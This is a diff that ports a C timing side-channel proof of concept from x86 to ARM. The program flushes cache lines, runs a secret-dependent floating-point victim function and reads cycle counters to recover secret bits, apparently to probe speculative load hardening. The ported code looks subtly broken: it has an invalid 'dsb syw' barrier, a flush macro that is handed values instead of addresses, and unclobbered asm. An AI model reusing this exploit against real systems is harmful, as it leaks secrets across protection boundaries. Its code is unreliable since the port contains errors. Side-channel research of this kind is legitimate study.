@@ -2,17 +2,28 @@
 #include <stdint.h>
 #include <stdlib.h>
 #include <unistd.h>
-#include <x86intrin.h>
-#include <xmmintrin.h>
+#include <arm_neon.h>
+// #include <x86intrin.h>
+// #include <xmmintrin.h>
 
 #define FAST 0x40f0000000000000
 #define SLOW 0x0010deadbeef1337
 #define SIZE 256
 #define STRIDE 1024
-#define BARRIER asm volatile ("lfence;\nmfence;\nsfence");
-#define CLFLUSH(a) \
+// #define BARRIER asm volatile ("lfence;\nmfence;\nsfence");
+#define BARRIER asm volatile("dsb syw;\nisb;\ndmb sy");
+
+//replacement for CLFLUSH
+#define FLUSH_CACHE_LINE(addr) \
 { \
-      asm volatile ("clflush 0(%0)": : "r" (&a):); \
+    asm volatile ("dc civac, %0" : : "r" (addr) : "memory"); \
+}
+
+//this is the replacement  for __rdtscp
+static inline uint64_t READ_CNTVCT_EL0(void) {
+    uint64_t val;
+    asm volatile("mrs %0, cntvct_el0" : "=r" (val));
+    return val;
 }
 
 uint64_t global_variable = 0xf;
@@ -22,6 +33,7 @@ uint64_t start, end;
 double value;
 static uint8_t array[SIZE * STRIDE] __attribute__((aligned(512)));
 uint64_t fast, slow;
+
 
 
 double __attribute__((optnone)) victim_function(register int secret, register int bit, int isPublic)
@@ -35,7 +47,13 @@ double __attribute__((optnone)) victim_function(register int secret, register in
     // USLH will harden this operation
     volatile double tmp2 = tmp * tmp;
     
-    asm volatile (".rept 47;\nsqrtsd %xmm0, %xmm0;\nmulsd %xmm0, %xmm0;\n.endr");
+    asm volatile (
+        "1: \n"  // Label for the loop start
+        ".rept 47\n\t"  // Repeat the following instructions 47 times
+        "fsqrt d0, d0\n\t"  // Compute the square root of the double-precision value in d0
+        "fmul d0, d0, d0\n\t"  // Multiply the value in d0 by itself
+        ".endr\n\t"
+    );
     *(volatile uint64_t*)&global_variable;
   }
   return 0;
@@ -63,23 +81,23 @@ int main(int argc, char *argv[])
     tmp_value2 = victim_function(0,0,0);
 
     BARRIER
-    CLFLUSH(array[0x2 * STRIDE]);
-    CLFLUSH(global_variable);
+    FLUSH_CACHE_LINE(array[0x2 * STRIDE]);
+    FLUSH_CACHE_LINE(global_variable);
     BARRIER
 
     tmp_value = victim_function(secret, i, 100);
 
     BARRIER
-    start = __rdtscp(&dummy);
+    start = READ_CNTVCT_EL0();
     *(volatile uint8_t*)&global_variable;
-    end = __rdtscp(&dummy) - start;
+    end = READ_CNTVCT_EL0() - start;
     BARRIER
 
     int tmp = end > 60 ? 0 : 1;
     result[i] = end;
     guess = guess | (tmp << i);
     BARRIER
-    asm volatile (".rept 4096;\nnop;\n.endr");
+    asm volatile (".rept 4096;\nnop;\n.endr;");
   }
   BARRIER
   for (int i = 0; i < 8; i++)
